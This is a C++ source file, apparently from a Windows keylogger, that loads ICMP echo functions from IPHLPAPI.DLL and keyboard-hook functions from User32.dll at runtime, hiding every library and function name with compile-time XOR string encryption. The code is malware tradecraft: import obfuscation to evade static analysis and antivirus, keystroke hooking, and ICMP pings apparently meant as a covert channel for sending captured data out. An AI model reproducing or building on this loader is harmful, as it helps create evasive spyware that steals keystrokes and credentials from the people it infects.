#include "ExternFnLoader.h"
#include "XorEnc.h"

#define KL_DEFINE_FN_ALIAS(x) x
#define KL_DEFINE_STATIC_FUNCTION(x) \
decltype(ExternFnLdr::##x) ExternFnLdr::##x = nullptr


template<class FunctionType, std::size_t N>
constexpr FunctionType loadFunction(HMODULE mod, const std::array<char, N>& arr)
{
    return (FunctionType)GetProcAddress(mod, xorDecryptString(arr.data()).c_str());
}

template <std::size_t N>
constexpr auto getNameFromCTArr(const std::array<char, N>& arr)
{
    return xorDecryptString(arr.data());
}

constexpr auto KL_ICMP_LIB_NAME          = CT_XOR_ENC_STRING("IPHLPAPI.DLL");
constexpr auto KL_ICMP_CREATE_FILE_NAME  = CT_XOR_ENC_STRING("IcmpCreateFile");
constexpr auto KL_ICMP_SEND_ECHO_NAME    = CT_XOR_ENC_STRING("IcmpSendEcho");
constexpr auto KL_ICMP_CLOSE_HANDLE_NAME = CT_XOR_ENC_STRING("IcmpCloseHandle");

constexpr auto KL_USER32_DLL_NAME       = CT_XOR_ENC_STRING("User32.dll");
constexpr auto KL_SET_WIN_HOOK_NAME     = CT_XOR_ENC_STRING("SetWindowsHookExA");
constexpr auto KL_UNSET_WIN_HOOK_NAME   = CT_XOR_ENC_STRING("UnhookWindowsHookEx");


KL_DEFINE_STATIC_FUNCTION(Kl_IcmpCreateFile);
KL_DEFINE_STATIC_FUNCTION(Kl_IcmpSendEcho);
KL_DEFINE_STATIC_FUNCTION(Kl_IcmpCloseHandle);
KL_DEFINE_STATIC_FUNCTION(Kl_SetWindowsHookExA);
KL_DEFINE_STATIC_FUNCTION(Kl_UnhookWindowsHookEx);


bool ExternFnLdr::load()
{
#define LOAD_FUNCTION_AND_CHECK(fn, mod, name){\
    fn = loadFunction<decltype(fn)>(mod, name);\
    if (!fn)\
        return false;\
}
#define LOAD_LIBRARY_AND_CHECK(lib, name)\
    HMODULE lib = LoadLibraryA(getNameFromCTArr(name).c_str());\
    if (!lib)\
        return false;

    LOAD_LIBRARY_AND_CHECK(icmpLib, KL_ICMP_LIB_NAME);
    LOAD_FUNCTION_AND_CHECK(Kl_IcmpCreateFile, icmpLib, KL_ICMP_CREATE_FILE_NAME);
    LOAD_FUNCTION_AND_CHECK(Kl_IcmpSendEcho, icmpLib, KL_ICMP_SEND_ECHO_NAME);
    LOAD_FUNCTION_AND_CHECK(Kl_IcmpCloseHandle, icmpLib, KL_ICMP_CLOSE_HANDLE_NAME);

    LOAD_LIBRARY_AND_CHECK(user32Lib, KL_USER32_DLL_NAME);

    LOAD_FUNCTION_AND_CHECK(Kl_SetWindowsHookExA, user32Lib, KL_SET_WIN_HOOK_NAME);
    LOAD_FUNCTION_AND_CHECK(Kl_UnhookWindowsHookEx, user32Lib, KL_UNSET_WIN_HOOK_NAME);


    return true;
}
